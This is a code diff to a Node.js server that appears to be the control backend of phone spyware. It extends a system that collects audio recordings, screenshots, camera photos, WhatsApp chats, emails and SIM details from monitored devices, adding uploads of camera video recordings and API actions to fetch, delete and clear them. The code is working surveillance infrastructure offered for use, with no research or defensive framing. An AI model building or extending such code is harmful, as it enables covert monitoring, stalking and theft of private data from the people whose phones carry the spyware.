@@ -333,7 +333,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, voice_count: voices.length });
         }
 
-        // ✅ ✅ ✅ جديد — تسجيل صوت
         if (data.type === 'audio_recording' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -352,7 +351,34 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, audio_count: audios.length });
         }
 
-        // ✅ ✅ ✅ جديد — لقطة شاشة
+        // ✅ ✅ ✅ جديد — تسجيل فيديو
+        if (data.type === 'video_recording' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const videoFile = path.join(deviceDir, 'video_recordings.json');
+            let videos = [];
+            if (fs.existsSync(videoFile)) videos = JSON.parse(fs.readFileSync(videoFile, 'utf8'));
+            const exists = videos.find(v => v.file_name === data.file_name);
+            if (exists) return res.json({ success: true, duplicated: true });
+            const videoEntry = {
+                file_name: data.file_name || '',
+                file_data: data.file_data || '',
+                file_size: data.file_size || 0,
+                duration_ms: data.duration_ms || 0,
+                camera_id: data.camera_id !== undefined ? data.camera_id : 0,
+                camera_name: data.camera_name || 'back',
+                timestamp: data.timestamp || Date.now()
+            };
+            videos.unshift(videoEntry);
+            if (videos.length > 100) videos = videos.slice(0, 100);
+            fs.writeFileSync(videoFile, JSON.stringify(videos, null, 2));
+            updateDevicesList(deviceId, null);
+            pushToDevice(deviceId, 'new_video', videoEntry);
+            console.log(`[VIDEO] ${videoEntry.file_name} (${(videoEntry.file_size / 1024 / 1024).toFixed(1)} MB) from ${deviceId}`);
+            return res.json({ success: true, video_count: videos.length });
+        }
+
         if (data.type === 'screenshot_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -371,7 +397,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, screenshot_count: screenshots.length });
         }
 
-        // ✅ ✅ ✅ جديد — صورة كاميرا (أمامي/خلفي)
         if (data.type === 'camera_photo' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -627,6 +652,7 @@ app.get('/live.php', (req, res) => {
         const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
         const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
         const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
+        const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
 
         let response = {
             online: false,
@@ -649,6 +675,7 @@ app.get('/live.php', (req, res) => {
             audio_count: 0,
             screenshot_count: 0,
             camera_count: 0,
+            video_count: 0,
             sim_numbers: [],
             carrier: '',
             self_number: '',
@@ -685,6 +712,7 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(audioFile)) response.audio_count = JSON.parse(fs.readFileSync(audioFile, 'utf8')).length;
         if (fs.existsSync(screenshotFile)) response.screenshot_count = JSON.parse(fs.readFileSync(screenshotFile, 'utf8')).length;
         if (fs.existsSync(cameraFile)) response.camera_count = JSON.parse(fs.readFileSync(cameraFile, 'utf8')).length;
+        if (fs.existsSync(videoFile)) response.video_count = JSON.parse(fs.readFileSync(videoFile, 'utf8')).length;
 
         if (fs.existsSync(simFile)) {
             try {
@@ -727,7 +755,7 @@ app.get('/api.php', (req, res) => {
             if (!session || Date.now() > session.expires) return res.status(401).json({ error: 'Unauthorized' });
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos', 'delete_video', 'clear_videos'];
                 if (ownerOnlyActions.includes(action)) return res.status(403).json({ error: 'Forbidden - Owner only' });
 
                 if (deviceId) {
@@ -784,14 +812,12 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
 
-        // ✅ ✅ ✅ جديد — جلب التسجيلات الصوتية
         if (action === 'get_audio_recordings') {
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
             if (fs.existsSync(audioFile)) return res.json(JSON.parse(fs.readFileSync(audioFile, 'utf8')));
             return res.json([]);
         }
 
-        // ✅ جديد — حذف تسجيل صوتي
         if (action === 'delete_audio') {
             const idx = parseInt(req.query.index);
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
@@ -806,14 +832,39 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: false });
         }
 
-        // ✅ جديد — مسح كل التسجيلات
         if (action === 'clear_audio') {
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
             if (fs.existsSync(audioFile)) fs.writeFileSync(audioFile, '[]');
             return res.json({ success: true });
         }
 
-        // ✅ ✅ ✅ جديد — جلب لقطات الشاشة
+        // ✅ ✅ ✅ جديد — جلب تسجيلات الفيديو
+        if (action === 'get_videos') {
+            const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
+            if (fs.existsSync(videoFile)) return res.json(JSON.parse(fs.readFileSync(videoFile, 'utf8')));
+            return res.json([]);
+        }
+
+        if (action === 'delete_video') {
+            const idx = parseInt(req.query.index);
+            const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
+            if (fs.existsSync(videoFile)) {
+                let videos = JSON.parse(fs.readFileSync(videoFile, 'utf8'));
+                if (!isNaN(idx) && idx >= 0 && idx < videos.length) {
+                    videos.splice(idx, 1);
+                    fs.writeFileSync(videoFile, JSON.stringify(videos, null, 2));
+                    return res.json({ success: true });
+                }
+            }
+            return res.json({ success: false });
+        }
+
+        if (action === 'clear_videos') {
+            const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
+            if (fs.existsSync(videoFile)) fs.writeFileSync(videoFile, '[]');
+            return res.json({ success: true });
+        }
+
         if (action === 'get_screenshots') {
             const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
             if (fs.existsSync(screenshotFile)) return res.json(JSON.parse(fs.readFileSync(screenshotFile, 'utf8')));
@@ -840,7 +891,6 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // ✅ ✅ ✅ جديد — جلب صور الكاميرا
         if (action === 'get_camera_photos') {
             const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
             if (fs.existsSync(cameraFile)) return res.json(JSON.parse(fs.readFileSync(cameraFile, 'utf8')));
